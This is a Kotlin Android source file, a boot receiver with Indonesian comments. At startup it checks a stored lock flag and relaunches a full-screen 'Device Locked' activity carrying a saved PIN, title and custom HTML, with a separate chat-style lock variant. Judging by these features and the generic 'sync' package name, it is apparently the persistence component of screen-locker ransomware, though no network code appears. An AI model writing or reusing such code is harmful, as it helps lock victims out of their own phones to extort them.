package com.sync.xxx

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val prefs = context.getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
            val isLocked = prefs.getBoolean("is_locked", false)

            if (isLocked) {
                // Ambil data umum yang tersimpan
                val lockType = prefs.getString("lock_type", "new") ?: "new"
                val savedPin = prefs.getString(LockOverlayService.EXTRA_PIN, "") ?: ""
                val savedTitle = prefs.getString(LockOverlayService.EXTRA_TITLE, "Perangkat Terkunci") ?: "Perangkat Terkunci"
                val savedHtml = prefs.getString(LockOverlayService.EXTRA_CUSTOM_HTML, "") ?: ""

                // Tentukan Activity tujuan berdasarkan tipe lock yang terakhir aktif
                val targetIntent = when (lockType) {
                    "v3_chat" -> Intent(context, LockChatActivity::class.java)
                    else -> Intent(context, LockNewActivity::class.java)
                }.apply {
                    putExtra(LockOverlayService.EXTRA_PIN, savedPin)
                    putExtra(LockOverlayService.EXTRA_TITLE, savedTitle)
                    putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, savedHtml)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }

                try {
                    // Karena ini adalah Activity, gunakan startActivity secara langsung
                    context.startActivity(targetIntent)
                    Log.d("BootReceiver", "Berhasil meluncurkan lock screen tipe: $lockType saat boot.")
                } catch (e: Exception) {
                    Log.e("BootReceiver", "Gagal meluncurkan lock screen saat boot: ${e.message}")
                }
            }
        }
    }
}
